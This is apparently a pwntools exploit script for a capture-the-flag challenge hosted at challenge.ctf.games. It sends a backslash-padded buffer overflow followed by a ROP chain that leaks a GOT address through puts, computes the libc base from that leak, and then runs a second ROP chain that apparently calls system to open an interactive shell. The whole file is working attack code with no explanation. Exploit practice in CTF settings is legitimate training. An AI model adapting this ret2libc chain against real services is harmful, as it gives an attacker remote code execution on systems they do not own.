from pwn import *
context.arch='amd64'
context.log_level='debug'
def cmd(c):
	p.sendlineafter("$",c)
#p=process('./pwn')
p=remote("challenge.ctf.games",30087)
puts=0x4010f0
got=0x403fb0
main=0x40156c
rdi=0x4015f3
ret=0x40156b
jmp=0x0000000000401017
rop=flat([rdi,got,0x96e6,0,0,0,puts,main])

payload=b"\\"*0x1e1+rop
#gdb.attach(p,'b *0x00000000040156B')
cmd(payload)
cmd("exit")
base=u64(p.readline()[:-1]+b'\0\0')-(0x7ffff7e495a0-0x7ffff7dc2000)
log.warning(hex(base))
rop=flat([0x0000000000401569,0,0,rdi,0,0x00000000004015ef,0,0,0,rdi,(0x7ffff7f795aa-0x7ffff7dc2000+base),0x55410+base])
#rop=b""
payload=b"\\"*0x1e1+rop
cmd(payload)
cmd("exit")
p.interactive()#1/4096
